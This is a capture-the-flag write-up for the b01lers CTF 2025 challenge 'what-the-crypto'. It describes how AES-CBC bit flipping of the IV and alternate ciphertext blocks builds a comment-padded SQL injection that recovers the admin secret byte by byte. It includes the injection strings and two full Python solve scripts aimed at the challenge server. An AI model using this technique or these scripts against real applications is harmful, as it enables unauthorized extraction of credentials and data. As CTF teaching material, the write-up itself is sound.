# what-the-crypto

[b01lers CTF 2025](https://b01lersc.tf/) - Web

Crafting an SQL injection query behind AES decryption

Writeup by [Arnav Vora](https://github.com/AVDestroyer)

> Your login information is end-to-end encrypted with AES, so it's definitely secure.

We won b01lers CTF 2025 as a team, and got a first blood on this challenge!

## Background

We are presented with a simple login endpoint. Looking at the source code, we see that by logging in, we are sending a POST request with our username and password. There is an allowlist of username and password characters, which only contains lowercase letters, underscore, and braces. Then, the username and password are padded to an AES block boundary and both are encrypted with AES-CBC with a random IV

Interestingly, these encrypted values are used in a redirect to a GET request. This endpoint now takes the encrypted username and password as parameters, decrypts them, and searches for the user in the database. The following query is used:

`query = f"SELECT * FROM users WHERE name='{username}' AND auth_secret='{password}'"`

If the username is found, we are welcomed with the decrypted username. If the username is not found, we receive an error message of "Incorrect username or password". Also, if there is an error with the query, we receive a different error message.

The DB comes with a users table that contains two columns: name and auth_secret. There is a user with name admin and auth_secret of the flag. The flag length is above 100 from an assertion statement.

## Solve

### SQL Injection

The SQL query used is very vulnerable to SQL injection. However, whatever we send to "/" must be decrypted first before being put into the query. We don't know the key, so we must use the POST request to "/" as an encryption oracle. But here is the problem: we cannot encrypt strings with characters used in most SQL injections since these are not in the allowlist.

### AES CBC

However, if we receive an encryption of a known, "clean" plaintext, we can tamper with its decryption quite easily. Since the scheme is AES-CBC, by flipping bits in the IV, the same bits are flipped in the first plaintext block after decryption. We send the IV along with the ciphertext to "/", so this should be quite doable. We just?? need to craft an SQL injection query that fits within one AES block (16 bytes).

Of course, this is actually quite hard to do. Our query is going to be several blocks long. So how will we tamper with the decryption to create this query?

### Crafting the SQL Query

If we wanted to get more characters in our query, we'd have to modify subsequent blocks. In AES-CBC, flipping one bit of a ciphertext block flips the corresponding bit in the next plaintext block, but also completely messes up the decryption in the current plaintext block. Obviously, this is not ideal for our query, so how can we get around this!

It turns out if that we can comment out parts of our SQL query in the injection. Specifically, we can modify the IV, ciphertext block 2, ciphertext block 4, ciphertext block 6, which modifies plaintext blocks 1, 3, 5, 7, etc. Each of these modified plaintext blocks will start with `*/` (except the first one) and end with `/*`, so that plaintext blocks 2, 4, 6, etc. are completely commented out. This is great because these are the blocks that will get decrypted into gibberish due to our modifications.

To exfiltrate the flag, we want to recover the value of `auth_secret` for the admin user. We will use queries that search for 6-grams (I chose 6-grams a little arbitrarily, as there were quite a lot of repeated trigrams and 6-grams was as long as I could get using the known prefix of 5 flag characters). This means we search for 6-long sequences of characters within the flag to build it. We know the first 5 characters of the flag are `bctf{`, so we can start guessing at the 6th character in the first 6-gram.

Injection we used: `' OR auth_secret GLOB '*GRAM*';--` where GRAM is the current 6-gram we are trying.
Resulting query: `SELECT * FROM users WHERE name='' OR auth_secret GLOB '*GRAM*';-- ...`

We are using GLOB instead of LIKE since '\_' is a character in the flag, and also a wildcard in a LIKE statement, making things really annoying.

But now, we need to add SQL comments to ensure that each part of our modified query fits within one AES block and comments out the junk caused by modifying our query.

| Block # |             Query plaintext              |
| ------- | :--------------------------------------: |
| IV      |                    --                    |
| 1       |   `'OR /* ...` (pad to 16 characters)    |
| 2       |            16 junk characters            |
| 3       | `*/auth_secret/*` (pad to 16 characters) |
| 4       |            16 junk characters            |
| 5       |    `*/GLOB/*` (pad to 16 characters)     |
| 6       |            16 junk characters            |
| 7       |  `*/'*GRAM*';--` (pad to 16 characters)  |

To construct this, we need to modify blocks 1, 3, 5, 7. If the desired plaintext of a block is `pt'`, while its actual plaintext is `pt`, then we need to do the following

`ct(i-1) := ct(i-1) XOR pt(i) XOR pt'(i)` where (i) means to select the ith plaintext or ciphertext block. Do this for odd values of i. If i = 1, i - 1 = 0, and define `ct(i-1)` to be the IV.

The only thing left is to grab a ciphertext for a known plaintext that is at least 7 blocks long. I just entered a username of 256\*'a' during the CTF, but the choice of this is very arbitrary.

### Getting the flag

By using the above strategy, we can exfiltrate the flag byte-by-byte. Our initial 6-gram contains 5 characters that we know are a prefix of the flag. Therefore, we only guess the last byte. If this byte is correct, the response from the server will welcome our new "username". We can use this response to know we have found the right byte from our query; otherwise, the response would tell us the "user" doesn't exist in the database (note: the query wouldn't error, it would just find no matches).

By guessing the right byte, we now have a new 5-byte prefix for our next 6-gram to guess. We simply take the last 5 bytes of the successful 6-gram we guess, and then add one more guess byte. By doing this, we can just guess one byte at a time in a sliding window fashion.

During the CTF, this solve was very finnicky though. I think there are a few reasons

- My network was really bad, causing some queries to fail and not find a character even if they should have, resulting to the default wildcard of '\*'
- Some modifications would result in null bytes inadvertently being placed in the plaintext query. Even if these bytes are commented out, they would cause an error with the database and could skip over correct bytes.
  - Simply trying a slightly different query helps fill in these holes (i.e. adding spaces, using LIKE instead of GLOB)
  - This probably caused the ticket(s) I sent you guys
- These problems were especially problematic when guessing some of the lowercase english characters of the flag at the front. I'm not sure why, but thankfully I could just guess these characters myself.

## Solve script(s)

Here is an example solve script with a known prefix of the flag. This can be used for any known prefix of the flag that is longer than `bctf{`, but it might miss some characters that you need to fill in (see previous section). This script uses GLOB, which is generally better than LIKE for this challenge for reasons described above.

```python
from string import Template
import string
import binascii
import requests
from tqdm import tqdm

# this is very jank im sorry
# computes xor of a,b but if their lengths differ, keep the trailing bytes of the longer string and do not modify them
def xor(a,b):
    if (len(a) > len(b)):
        return b''.join([(i ^ j).to_bytes(1,"little") for i,j in zip(a,b)]) + a[len(b):]
    else:
        return b''.join([(i ^ j).to_bytes(1,"little") for i,j in zip(a,b)]) + b[len(a):]

# link = 'https://what-the-crypto.harkonnen.b01lersc.tf/?username=8cee7ad0328c752fd62d3dc19a56c1aecd0707cafcc2225cd9b5af8b4d79bf9d18f9ac7950eceb607fa78e5909e0ff3e8eb2c93a1bc26b986cd0786b1b05f4b6fadb7634a75b359afc10b773a51bc42c6e6bc46dd0807a1636dfc1679090a553b80ae0946d6663f7e019c8a2eaa22eec8db6122c55478e58fc4aa4cdf46f4f09da096a5c444bf8413ad76d0ce859c4e4&password=bd0e2c124c410b54f4d27402982ac522d0a9e739f368c1ffb9f983080507bf92'
uname = '3cb0bfd89fc17bb62a595c1bda1c404528c2b928f4c0dd16e9895258ad46386aa45aafdce4bfd55068191bdc9d581622f6c6f67ed82e91d86d689dc3d25f419a98d5bc3dcbdfe30602d37fb1f1678ad42b2fc14fb3496f8d1f32c72c818ed4fc319261d249d20a5c542eb36c2c1309f8d9ca8e6dc48c129f2fedcbbd2aeeb11f6bee0ba07213eced42c80dd29d769bfc'
uname_blocks = [binascii.unhexlify(uname[i:i+32]) for i in range(0,len(uname),32)]

block = b'aaaaaaaaaaaaaaaa'
query_part1 = b"'OR /*"
query_part2 = b"*/auth_secret/*"
query_part3 = b'*/GLOB/*'

s = requests.Session()

flag = 'bctf{y0u_w0u1dnt_d3crypt_4_c4r_494816651075691437196384986030349966922111068829715192842094121854721561'

current_prefix = flag[-5:]

for i in tqdm(range(200)):
    for j in ('_' + '0123456789' + '}' + string.ascii_lowercase + '-' + '?'):
    #for j in set(string.printable) - set(string.whitespace) - set("*?"):
        ngram = current_prefix + j

        query_part4 = Template("*/'*$gram*';--")
        query_part4 = query_part4.substitute(gram=ngram).encode()

        # construct the modified query ciphertext
        # also extremely jank sorry
        uname = xor(uname_blocks[0],xor(block[:len(query_part1)],query_part1)) + uname_blocks[1] + xor(uname_blocks[2],xor(block[:len(query_part2)],query_part2)) + uname_blocks[3] + xor(uname_blocks[4],xor(block[:len(query_part3)],query_part3)) + uname_blocks[5] + xor(uname_blocks[6],xor(block[:len(query_part4)],query_part4)) + uname_blocks[7]
        uname_hex = uname.hex()

        new_link = f"https://what-the-crypto.harkonnen.b01lersc.tf/?username={uname_hex}&password=bd0e2c124c410b54f4d27402982ac522d0a9e739f368c1ffb9f983080507bf92"

        response = s.get(new_link)
        #print(response.text)
        if (response.status_code == 200):
            print(f"Added: {ngram}")
            flag += j
            print(flag)
            current_prefix = flag[-5:]
            break


print(flag)
```

However, we also used this LIKE-based script to recover other characters in the flag. This was needed for reasons described earlier.

```python
from string import Template
import string
import binascii
import requests
from tqdm import tqdm

# this is very jank im sorry
# computes xor of a,b but if their lengths differ, keep the trailing bytes of the longer string and do not modify them
def xor(a,b):
    if (len(a) > len(b)):
        return b''.join([(i ^ j).to_bytes(1,"little") for i,j in zip(a,b)]) + a[len(b):]
    else:
        return b''.join([(i ^ j).to_bytes(1,"little") for i,j in zip(a,b)]) + b[len(a):]

# link = 'https://what-the-crypto.harkonnen.b01lersc.tf/?username=8cee7ad0328c752fd62d3dc19a56c1aecd0707cafcc2225cd9b5af8b4d79bf9d18f9ac7950eceb607fa78e5909e0ff3e8eb2c93a1bc26b986cd0786b1b05f4b6fadb7634a75b359afc10b773a51bc42c6e6bc46dd0807a1636dfc1679090a553b80ae0946d6663f7e019c8a2eaa22eec8db6122c55478e58fc4aa4cdf46f4f09da096a5c444bf8413ad76d0ce859c4e4&password=bd0e2c124c410b54f4d27402982ac522d0a9e739f368c1ffb9f983080507bf92'
uname = '3cb0bfd89fc17bb62a595c1bda1c404528c2b928f4c0dd16e9895258ad46386aa45aafdce4bfd55068191bdc9d581622f6c6f67ed82e91d86d689dc3d25f419a98d5bc3dcbdfe30602d37fb1f1678ad42b2fc14fb3496f8d1f32c72c818ed4fc319261d249d20a5c542eb36c2c1309f8d9ca8e6dc48c129f2fedcbbd2aeeb11f6bee0ba07213eced42c80dd29d769bfc'
uname_blocks = [binascii.unhexlify(uname[i:i+32]) for i in range(0,len(uname),32)]

block = b'aaaaaaaaaaaaaaaa'
query_part1 = b"'OR /*"
query_part2 = b"*/auth_secret/*"
query_part3 = b'*/LIKE/*'

s = requests.Session()

flag = 'bctf{'

current_prefix = flag[-5:]

for i in tqdm(range(200)):
    for j in (string.ascii_lowercase + '0123456789' + '_'):
        ngram = current_prefix + j

        query_part4 = Template("*/'%$gram%';--")
        query_part4 = query_part4.substitute(gram=ngram).encode()

        # construct the modified query ciphertext
        # also extremely jank sorry
        uname = xor(uname_blocks[0],xor(block[:len(query_part1)],query_part1)) + uname_blocks[1] + xor(uname_blocks[2],xor(block[:len(query_part2)],query_part2)) + uname_blocks[3] + xor(uname_blocks[4],xor(block[:len(query_part3)],query_part3)) + uname_blocks[5] + xor(uname_blocks[6],xor(block[:len(query_part4)],query_part4)) + uname_blocks[7]
        uname_hex = uname.hex()

        new_link = f"https://what-the-crypto.harkonnen.b01lersc.tf/?username={uname_hex}&password=bd0e2c124c410b54f4d27402982ac522d0a9e739f368c1ffb9f983080507bf92"

        response = s.get(new_link)
        #print(response.text)
        if (response.status_code == 200):
            print(f"Added: {ngram}")
            flag += j
            print(flag)
            current_prefix = flag[-5:]
            break


print(flag)
```

## Flag

`bctf{y0u_w0u1dnt_d3crypt_4_c4r_494816651075691437196384986030349966922111068829715192842094121854721561838287531984681055517649308307282068786676919582}`
